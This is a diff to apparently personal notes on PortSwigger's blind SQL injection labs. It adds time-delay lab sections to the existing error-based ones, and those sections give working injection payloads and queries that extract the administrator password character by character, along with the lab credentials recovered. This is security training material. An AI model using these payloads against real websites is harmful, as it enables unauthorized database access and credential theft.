@@ -151,11 +151,44 @@ Vulnerable URL: https://domain/filter?category=category
 Test payload: `cookie' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--` and `cookie' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--`
 - When the first query is injected the page loads normally, but when the second query is injected and error page is loaded due a 500 error (server error, database error in that case). The site has unhandled database errors, making it vulnerable to blind SQL injection
 
-To get the administrator, the logic is the same as the previous lab. It can also be done through Burp Intruder or an script. The only thing that change are the queries (different technique and database)
+To get the administrator password, the logic is the same as the previous lab. It can also be done through Burp Intruder or an script. The only thing that change are the queries (different technique and database)
 - Query to get the password size: `' AND (SELECT CASE WHEN (LENGTH(password) > [size]) THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--`
 - Query to enumerate the password: `' AND (SELECT CASE WHEN (SUBSTR(password, [position], 1) = '[character]') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--`
 
 To solve the lab log in as `administrator:r17fdjbk4v1bdmqqisd8`
+
+
+### [Lab: Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+
+Vulnerable URL: https://domain/filter?category=category
+- This URL does not provide any elements that interacts with the injected SQL neighter reacts with database errors
+
+Test payload: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+- This payload triggers a time delay that can be confirmed with a longer page loading time
+
+
+### [Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+
+Vulnerable URL: https://domain/filter?category=category
+
+Test payload: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
+- This is a PostgreSQL database
+
+To get the administrator password, the logic is the same as the previous enumeration labs. The queries will be:
+- Query to get the password size: `'; SELECT CASE WHEN (LENGTH(password) > [size]) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--`
+- Query to enumerate the password: `'; SELECT CASE WHEN (SUBSTR(password, [position], 1) = '[character]') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--`
+
+To solve the lab log in as `administrator:yb1hh06qlempkmxh6yto`
+
+
+### [Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
+
+This lab requires Burp Collaborator
+
+
+### [Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+This lab requires Burp Collaborator
 
 
 ## References
